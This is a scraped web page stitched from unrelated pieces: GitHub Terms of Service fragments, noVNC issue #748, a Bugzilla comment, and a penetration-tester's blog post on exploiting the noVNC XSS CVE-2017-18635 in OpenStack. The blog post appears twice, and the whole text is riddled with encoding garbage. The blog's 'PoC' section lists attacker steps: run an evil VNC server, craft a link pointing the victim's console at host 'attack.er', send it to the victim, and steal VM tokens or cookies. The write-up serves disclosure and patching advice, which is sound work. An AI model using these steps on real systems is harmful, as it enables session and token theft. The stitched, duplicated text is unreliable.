### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service âas isâ and âas available,â without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

GitHub does not warrant that the Service will meet your requirements; that the Service will be uninterrupted, timely, secure, or error-free; that the information provided through the Service is accurate, reliable or correct; that any defects or errors will be corrected; that the Service will be available at any particular time or location; or that the Service is free of viruses or other harmful components. You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## Description

[![@DirectXMan12](https://avatars.githubusercontent.com/u/119737?u=597ba8af63df2378ebe52f5d1fdffa6d829f9c51&v=4&size=48)](/DirectXMan12)[DirectXMan12](https://github.com/DirectXMan12)opened [on Jan 12, 2017](https://github.com/novnc/noVNC/issues/748#issue-200464792)

An XSS vulnerability was discovered in noVNC in which the remote VNC server could inject arbitrary HTML into the noVNC web page via the messages propagated to the status field, such as the VNC server name.

This affects users of vnc\_auto.html and vnc.html, as well as any users of include/ui.js.

Thanks to David Wyde of Cisco for reporting the issue.

This was fixed in [noVNC v0.6.2](https://github.com/novnc/noVNC/releases/tag/v0.6.2), as well as [6048299](https://github.com/novnc/noVNC/commit/6048299a138e078aed210f163111698c8c526a13)

# Exploiting an old noVNC XSS (CVE-2017-18635) in OpenStack

**TL;DR:**ÃÂ noVNC had a **DOM-based XSS** that allowed attackers to use a malicious VNC
server to inject JavaScript code inside the web page.
As OpenStack uses noVNC and its patching system doesnÃ¢ÂÂt update third partiesÃ¢ÂÂ software, fully-updated OpenStack installations may still be vulnerable.

![](/img/blog/openstack-novnc-xss.png)
## Introduction

Last week I was testing an **OpenStack** infrastructure during a [Penetration Test](https://www.shielder.com/servizi/sicurezza-informatica/penetration-test.php).
OpenStack is a *free* and *open-source* software platform for cloud computing, where you can manage and deploy virtual servers and other resources.
OpenStack is a huge piece of software, made of many different Ã¢ÂÂ*modules* Ã¢ÂÂ, as can be seen in the [official Github repository](https://github.com/openstack/openstack).

First I started by launching a new instance with a random OS image to see how I could interact with it.
When you run a new VM on OpenStack you have two main ways to administer it: you can assign it to a network with a Public IP, open the required port(s) and use your favorite remote administration protocol (SSH, RDP, etc.) or you can use the OpenStackÃ¢ÂÂs Ã¢ÂÂ***Console***Ã¢ÂÂ feature.

The Ã¢ÂÂ***Console***Ã¢ÂÂ feature uses **noVNC**, an **HTML VNC** client that let you see your VM screen over the internet directly in your browser. Nice!
IÃ¢ÂÂve used VNC clients many times before but never an HTML one so I was wondering how it worked and I landed on theÃÂ [noVNC github repository](https://github.com/novnc/noVNC/).
After a quick look at theÃÂ [websockify](https://github.com/novnc/websockify)ÃÂ subrepo, the noVNC component that tunnels a TCP connection over websockets, I searched both repos for **security issues**.

## Hunting for vulnerabilities

TheÃÂ [Issue #748](https://github.com/novnc/noVNC/issues/748)ÃÂ immediately popÃ¢ÂÂd up, an **XSS** in noVNC that was patched in version 0.6.2 from January 2017.
TheÃÂ [patch](https://github.com/novnc/noVNC/commit/6048299a138e078aed210f163111698c8c526a13)ÃÂ is very straightforward:ÃÂ `s/innerHTML/textContent/g`.

The particularity of this bug was that **no CVE** was assigned, **no public exploit** was available, GNU/Linux distributions **didnÃ¢ÂÂt published a security update** for theÃÂ [noVNC package](https://pkgs.org/download/novnc)ÃÂ and
OpenStack **didnÃ¢ÂÂt released aÃÂ [Security Notice](https://bugs.launchpad.net/horizon/%2Bbug/1656435)**ÃÂ for it,but it just updated the vulnerable component in new OpenStackÃ¢ÂÂs installations
(as the noVNC component is usually git-cloned during installation or installed from the distrosÃ¢ÂÂ repositories), leaving all previous one unpatched.
So I had a potential vulnerability, which existence I could check easily!

## Your vulnerability has been confirmed

A simple **CTRL+U** on my target Ã¢ÂÂConsoleÃ¢ÂÂ page and a **CTRL+F** allowed me to confirm it was vulnerable, **yay**!

Looking at the issue description we can see:

> An XSS vulnerability was discovered in noVNC in which the remote VNC server could inject arbitrary HTML into the noVNC web page via the messages propagated to the status field, such as the VNC server name.

So I though it was just a matter of changing the VMÃ¢ÂÂs name inside OpenStack to trigger the XSS.
Not so fastÃ¢ÂÂ¦
This would only result in a self-XSS and moreover OpenStack sanitizes the VM name.
`ÃÂ¯\_(Ã£ÂÂ)_/ÃÂ¯`

OpenStackÃ¢ÂÂs noVNC version comes in a singleÃÂ `vnc_auto.html`ÃÂ page, which is invoked with aÃÂ `token`ÃÂ GET parameter. The aforementionedÃÂ [token](https://docs.openstack.org/nova/pike/admin/remote-console-access.html)ÃÂ is issued by OpenStackÃ¢ÂÂs API and allows you to access a specific VM.

## Theory is fine, but give me the exploit

Time to write the **exploit** to show our customer the impact of this vulnerability!
By looking at the source code, it turned out that you can specify along with theÃÂ `token`ÃÂ parameter also theÃÂ `host`ÃÂ and theÃÂ `port`ÃÂ ones, which will tell the client the noVNC server it must connect to.
So I can now force the noVNC client hosted on the customerÃ¢ÂÂs OpenStack domain to connect to an arbitrary noVNC server.

As stated before, reversing the patch is straightforward and we can notice that theÃÂ `status`ÃÂ function in theÃÂ `vnc_auto.html`ÃÂ file will use the statusÃÂ `text`ÃÂ asÃÂ `innerHTML`ÃÂ every time there is a status change.
(<https://github.com/novnc/noVNC/commit/6048299a138e078aed210f163111698c8c526a13#diff-22286f77c1852bf6a87298df3bfbb452L149>)

In particular theÃÂ `status`ÃÂ function is called with theÃÂ `server-name`ÃÂ as input when connecting to an external noVNC server.
(<https://github.com/novnc/noVNC/blob/41f476a86357f1404fcca078212c702599bbcc57/vnc_auto.html#L162>)

With all these information in mind I wrote an *evil* Ã¢ÂÂnoVNC serverÃ¢ÂÂ Ã°ÂÂÂ that starts the VNC handshake, sends asÃÂ `server-name`ÃÂ a JavaScript payload, waits 30 seconds and finally closes the connection.
This will cause any vulnerable noVNC client which connects to it to execute the payload present inside theÃÂ `server-name`ÃÂ parameter.

## PoC || GTFO

To reproduce the vulnerability an attacker must:

1. Install websockify (`pip3 install websockify`)
2. Download (<https://github.com/ShielderSec/cve-2017-18635>) and run the evil VNC serverÃÂ (`python3 cve-2017-18635.py &`)
3. Expose the VNC server through websockify (a valid SSL/TLS certificate is required if the target noVNC client is exposed via HTTPS)ÃÂ (`python3 -m websockify --cert=cert.pem --key=key.pem 6080 127.0.0.1:5902`)
4. Craft the connection URL of the targetÃ¢ÂÂs noVNC client with the attackerÃ¢ÂÂs server asÃÂ `host`ÃÂ andÃÂ `port`ÃÂ parametersÃÂ (`https://openstack.vict.im/vnc_auto.html?host=attack.er&port=6080`)
5. Send the link to the victim with your favorite Ã°ÂÂÂ£ technique
6. Profit by stealing the OpenStackÃ¢ÂÂs VM tokens from the victimÃ¢ÂÂs browser localStorage or by stealing the victimÃ¢ÂÂs cookies

## Takeaways

Writing n-day exploits is always fun and this time some considerations should be done:

* As no CVE was assigned to the vulnerability I requested one (**[CVE-2017-18635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18635)**), so it can be easily referenced.
* No GNU/Linux distribution issued security updates at the time. This process is now slowly starting in LTS versions ([https://lists.debian.org/debian-lts-announce/2019/10/msg00004.html)](https://lists.debian.org/debian-lts-announce/2019/10/msg00004.html%29). *Update:* RedHat released a backdated [Security Advisory](https://access.redhat.com/security/cve/CVE-2017-18635)
* The OpenStackÃ¢ÂÂs patching system for third-party vulnerabilities is not that efficient, so if youÃ¢ÂÂre running an OpenStack server make sure to read all theirÃÂ [security notices](https://wiki.openstack.org/wiki/Security_Notes)ÃÂ and manually update third-party software.
* **ALWAYS**ÃÂ SANITIZE USER-SUPPLIED INPUT!

| [Comment 13](show_bug.cgi?id=1484711#c13)  Stephen Finucane    2018-03-15 15:53:26 UTC  ``` I validated a recent deployment with noVNC 1.0. It was necessary to change nova's '[vnc] novncproxy_base_url' from '{address}/vnc_auto.html' to '{address}/vnc_simple.html'. This is because of commit 83391ffc in noVNC [1]. Once that was done, everything worked as expected. However, 'vnc_simple.html' only works with noVNC 1.0 while 'vnc_auto.html' only works with 0.6.x and prior. As such, we would need to upgrade noVNC _and_ update the configuration for all hosts at the same time to avoid breaking anything. This seems unrealistic.  There are two possible options here:  - Symlink 'vnc_auto.html' to 'vnc_simple.html', thus retaining backwards compatibility.  - Start using a different url, 'vnc.html?path=websockify', which apparently works with both 0.6 and 1.0. [2]  The first of these seems a more viable option in the short term. If we proceed with this, we'll also need a migration path to ensure we don't have to carry this patch forever. This will involve updating the values in 'nova.conf' to one of the above at upgrade time.

# Exploiting an old noVNC XSS (CVE-2017-18635) in OpenStack

**TL;DR:**ÃÂ noVNC had a **DOM-based XSS** that allowed attackers to use a malicious VNC
server to inject JavaScript code inside the web page.
As OpenStack uses noVNC and its patching system doesnÃ¢ÂÂt update third partiesÃ¢ÂÂ software, fully-updated OpenStack installations may still be vulnerable.

![](/img/blog/openstack-novnc-xss.png)
## Introduction

Last week I was testing an **OpenStack** infrastructure during a [Penetration Test](https://www.shielder.com/servizi/sicurezza-informatica/penetration-test.php).
OpenStack is a *free* and *open-source* software platform for cloud computing, where you can manage and deploy virtual servers and other resources.
OpenStack is a huge piece of software, made of many different Ã¢ÂÂ*modules* Ã¢ÂÂ, as can be seen in the [official Github repository](https://github.com/openstack/openstack).

First I started by launching a new instance with a random OS image to see how I could interact with it.
When you run a new VM on OpenStack you have two main ways to administer it: you can assign it to a network with a Public IP, open the required port(s) and use your favorite remote administration protocol (SSH, RDP, etc.) or you can use the OpenStackÃ¢ÂÂs Ã¢ÂÂ***Console***Ã¢ÂÂ feature.

The Ã¢ÂÂ***Console***Ã¢ÂÂ feature uses **noVNC**, an **HTML VNC** client that let you see your VM screen over the internet directly in your browser. Nice!
IÃ¢ÂÂve used VNC clients many times before but never an HTML one so I was wondering how it worked and I landed on theÃÂ [noVNC github repository](https://github.com/novnc/noVNC/).
After a quick look at theÃÂ [websockify](https://github.com/novnc/websockify)ÃÂ subrepo, the noVNC component that tunnels a TCP connection over websockets, I searched both repos for **security issues**.

## Hunting for vulnerabilities

TheÃÂ [Issue #748](https://github.com/novnc/noVNC/issues/748)ÃÂ immediately popÃ¢ÂÂd up, an **XSS** in noVNC that was patched in version 0.6.2 from January 2017.
TheÃÂ [patch](https://github.com/novnc/noVNC/commit/6048299a138e078aed210f163111698c8c526a13)ÃÂ is very straightforward:ÃÂ `s/innerHTML/textContent/g`.

The particularity of this bug was that **no CVE** was assigned, **no public exploit** was available, GNU/Linux distributions **didnÃ¢ÂÂt published a security update** for theÃÂ [noVNC package](https://pkgs.org/download/novnc)ÃÂ and
OpenStack **didnÃ¢ÂÂt released aÃÂ [Security Notice](https://bugs.launchpad.net/horizon/%2Bbug/1656435)**ÃÂ for it,but it just updated the vulnerable component in new OpenStackÃ¢ÂÂs installations
(as the noVNC component is usually git-cloned during installation or installed from the distrosÃ¢ÂÂ repositories), leaving all previous one unpatched.
So I had a potential vulnerability, which existence I could check easily!

## Your vulnerability has been confirmed

A simple **CTRL+U** on my target Ã¢ÂÂConsoleÃ¢ÂÂ page and a **CTRL+F** allowed me to confirm it was vulnerable, **yay**!

Looking at the issue description we can see:

> An XSS vulnerability was discovered in noVNC in which the remote VNC server could inject arbitrary HTML into the noVNC web page via the messages propagated to the status field, such as the VNC server name.

So I though it was just a matter of changing the VMÃ¢ÂÂs name inside OpenStack to trigger the XSS.
Not so fastÃ¢ÂÂ¦
This would only result in a self-XSS and moreover OpenStack sanitizes the VM name.
`ÃÂ¯\_(Ã£ÂÂ)_/ÃÂ¯`

OpenStackÃ¢ÂÂs noVNC version comes in a singleÃÂ `vnc_auto.html`ÃÂ page, which is invoked with aÃÂ `token`ÃÂ GET parameter. The aforementionedÃÂ [token](https://docs.openstack.org/nova/pike/admin/remote-console-access.html)ÃÂ is issued by OpenStackÃ¢ÂÂs API and allows you to access a specific VM.

## Theory is fine, but give me the exploit

Time to write the **exploit** to show our customer the impact of this vulnerability!
By looking at the source code, it turned out that you can specify along with theÃÂ `token`ÃÂ parameter also theÃÂ `host`ÃÂ and theÃÂ `port`ÃÂ ones, which will tell the client the noVNC server it must connect to.
So I can now force the noVNC client hosted on the customerÃ¢ÂÂs OpenStack domain to connect to an arbitrary noVNC server.

As stated before, reversing the patch is straightforward and we can notice that theÃÂ `status`ÃÂ function in theÃÂ `vnc_auto.html`ÃÂ file will use the statusÃÂ `text`ÃÂ asÃÂ `innerHTML`ÃÂ every time there is a status change.
(<https://github.com/novnc/noVNC/commit/6048299a138e078aed210f163111698c8c526a13#diff-22286f77c1852bf6a87298df3bfbb452L149>)

In particular theÃÂ `status`ÃÂ function is called with theÃÂ `server-name`ÃÂ as input when connecting to an external noVNC server.
(<https://github.com/novnc/noVNC/blob/41f476a86357f1404fcca078212c702599bbcc57/vnc_auto.html#L162>)

With all these information in mind I wrote an *evil* Ã¢ÂÂnoVNC serverÃ¢ÂÂ Ã°ÂÂÂ that starts the VNC handshake, sends asÃÂ `server-name`ÃÂ a JavaScript payload, waits 30 seconds and finally closes the connection.
This will cause any vulnerable noVNC client which connects to it to execute the payload present inside theÃÂ `server-name`ÃÂ parameter.

## PoC || GTFO

To reproduce the vulnerability an attacker must:

1. Install websockify (`pip3 install websockify`)
2. Download (<https://github.com/ShielderSec/cve-2017-18635>) and run the evil VNC serverÃÂ (`python3 cve-2017-18635.py &`)
3. Expose the VNC server through websockify (a valid SSL/TLS certificate is required if the target noVNC client is exposed via HTTPS)ÃÂ (`python3 -m websockify --cert=cert.pem --key=key.pem 6080 127.0.0.1:5902`)
4. Craft the connection URL of the targetÃ¢ÂÂs noVNC client with the attackerÃ¢ÂÂs server asÃÂ `host`ÃÂ andÃÂ `port`ÃÂ parametersÃÂ (`https://openstack.vict.im/vnc_auto.html?host=attack.er&port=6080`)
5. Send the link to the victim with your favorite Ã°ÂÂÂ£ technique
6. Profit by stealing the OpenStackÃ¢ÂÂs VM tokens from the victimÃ¢ÂÂs browser localStorage or by stealing the victimÃ¢ÂÂs cookies

## Takeaways

Writing n-day exploits is always fun and this time some considerations should be done:

* As no CVE was assigned to the vulnerability I requested one (**[CVE-2017-18635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18635)**), so it can be easily referenced.
* No GNU/Linux distribution issued security updates at the time. This process is now slowly starting in LTS versions ([https://lists.debian.org/debian-lts-announce/2019/10/msg00004.html)](https://lists.debian.org/debian-lts-announce/2019/10/msg00004.html%29). *Update:* RedHat released a backdated [Security Advisory](https://access.redhat.com/security/cve/CVE-2017-18635)
* The OpenStackÃ¢ÂÂs patching system for third-party vulnerabilities is not that efficient, so if youÃ¢ÂÂre running an OpenStack server make sure to read all theirÃÂ [security notices](https://wiki.openstack.org/wiki/Security_Notes)ÃÂ and manually update third-party software.
* **ALWAYS**ÃÂ SANITIZE USER-SUPPLIED INPUT!
